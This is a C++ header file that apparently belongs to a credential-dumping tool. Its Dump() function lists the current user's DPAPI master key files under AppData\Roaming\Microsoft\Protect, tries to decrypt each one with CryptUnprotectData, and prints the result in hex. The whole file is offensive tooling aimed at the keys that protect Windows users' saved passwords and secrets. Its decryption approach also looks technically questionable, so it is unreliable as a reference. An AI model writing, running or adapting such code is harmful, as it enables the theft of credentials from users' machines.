#ifndef DPAPI_MASTER_KEYS_H
#define DPAPI_MASTER_KEYS_H

#include <windows.h>
#include <wincrypt.h>
#include <shlobj.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <iomanip>
#include <filesystem>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "shell32.lib")

namespace DpapiMasterKeys {

    inline std::string WStringToString(const std::wstring& wstr) {
        if (wstr.empty()) return "";
        int size = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, nullptr, 0, nullptr, nullptr);
        std::string result(size - 1, 0);
        WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &result[0], size, nullptr, nullptr);
        return result;
    }

    inline std::wstring GetRoamingAppData() {
        wchar_t* path = nullptr;
        SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, nullptr, &path);
        std::wstring result(path);
        CoTaskMemFree(path);
        return result;
    }

    inline void Dump() {
        std::cout << "\n=== DPAPI Master Keys (User Scope) ===\n";

        std::wstring protectPath = GetRoamingAppData() + L"\\Microsoft\\Protect";
        WIN32_FIND_DATAW findSid;
        HANDLE hSid = FindFirstFileW((protectPath + L"\\*").c_str(), &findSid);

        if (hSid == INVALID_HANDLE_VALUE) {
            std::cout << "[-] Protect directory not found.\n";
            return;
        }

        do {
            if (!(findSid.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
            if (wcscmp(findSid.cFileName, L".") == 0 ||
                wcscmp(findSid.cFileName, L"..") == 0) continue;

            std::wstring sidPath = protectPath + L"\\" + findSid.cFileName;
            WIN32_FIND_DATAW findFile;
            HANDLE hFile = FindFirstFileW((sidPath + L"\\*").c_str(), &findFile);
            if (hFile == INVALID_HANDLE_VALUE) continue;

            do {
                if (findFile.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
                std::wstring filePath = sidPath + L"\\" + findFile.cFileName;

                std::ifstream f(std::filesystem::path(filePath), std::ios::binary);
                std::vector<BYTE> data((std::istreambuf_iterator<char>(f)),
                                       std::istreambuf_iterator<char>());
                if (data.empty()) continue;

                DATA_BLOB in{ static_cast<DWORD>(data.size()), data.data() };
                DATA_BLOB out{ 0, nullptr };

                if (CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr, 0, &out)) {
                    std::cout << "[+] Master Key GUID: "
                              << WStringToString(findFile.cFileName) << "\n";
                    std::cout << "    Decrypted (hex): ";
                    for (DWORD i = 0; i < out.cbData; ++i)
                        std::cout << std::hex << std::setw(2) << std::setfill('0')
                                  << static_cast<int>(out.pbData[i]);
                    std::cout << std::dec << "\n";
                    LocalFree(out.pbData);
                }
            } while (FindNextFileW(hFile, &findFile));
            FindClose(hFile);
        } while (FindNextFileW(hSid, &findSid));
        FindClose(hSid);
    }
}

#endif